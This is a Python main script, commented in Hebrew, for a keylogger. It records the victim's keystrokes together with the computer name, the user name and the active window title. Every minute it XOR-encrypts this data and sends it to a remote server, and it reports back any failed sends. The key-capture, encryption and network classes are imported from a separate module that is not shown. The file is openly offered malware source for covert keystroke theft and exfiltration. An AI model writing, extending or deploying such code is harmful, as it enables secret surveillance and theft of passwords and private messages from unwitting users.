import json
from component import *
import time
import os
import socket
import time
import pygetwindow as gw


# הגדרת תדירות השליחה (בשניות)
SEND_INTERVAL = 60  # ניתן לשנות לפי הצורך

def get_active_window() -> str:
    """מחזיר את שם האפליקציה הפעילה (אם אפשר)"""
    try:
        active_window = gw.getActiveWindow()
        return active_window.title if active_window else "Unknown App"
    except Exception:
        return "Unknown App"

def main() -> None:
    # יצירת אובייקטים
    key_logger = KeyLoggerService()
    encryptor = XorEcryptor()

    # זיהוי שם המחשב ושם המשתמש
    computer_name = socket.gethostname()
    try:
        user_name = os.getlogin()
    except Exception:
        user_name = "UnknownUser"

    key_logger.start_logging()  # התחלת ההקלטה

    last_error = None  # משתנה לשמירת הודעות שגיאה במקרה של כשלון שליחה

    try:
        while True:
            time.sleep(SEND_INTERVAL)  # מחכה לפי ההגדרה
            
            # חותמת זמן
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            
            # קבלת שם האפליקציה הפעילה
            active_app: str = get_active_window()
            
            # איסוף הנתונים שנאספו
            logged_keys: list[str] = key_logger.get_logged_keys()
            # key_data = "".join(logged_keys) if logged_keys else "No keys pressed"
            key_data: str = str(logged_keys) if logged_keys else "No keys pressed"

            # יצירת המידע לשליחה
            data_to_send: dict[str, str] = {
                "timestamp": timestamp,
                "computer_name": computer_name,
                "user_name": user_name,
                "active_app": active_app,  # הוספת האפליקציה הפעילה
                "keys": key_data
            }

            # אם היה כשלון קודם, נוסיף אותו להודעה כדי שהשרת ידע
            if last_error:
                data_to_send["last_error"] = last_error
                last_error = None  # מאפסים את השגיאה אחרי שהודענו עליה

            # הצפנה
            json_data = json.dumps(data_to_send)  # Convert dictionary to JSON string
            encrypted_data: bytes = encryptor.encrypt(json_data)

            # שליחה לשרת
            try:
                status_code: int = NetworkWriter.send_data(encrypted_data)
                print(status_code)
                key_logger.clear_log()  # ניקוי הלוג אחרי שליחה מוצלחת
            except Exception as e:
                last_error: str = f"Failed to send data at {timestamp}: {str(e)}"

    except KeyboardInterrupt:
        key_logger.stop_logging()  # עצירת ההקלטה אם התהליך נעצר ידנית

if __name__ == "__main__":
    main()
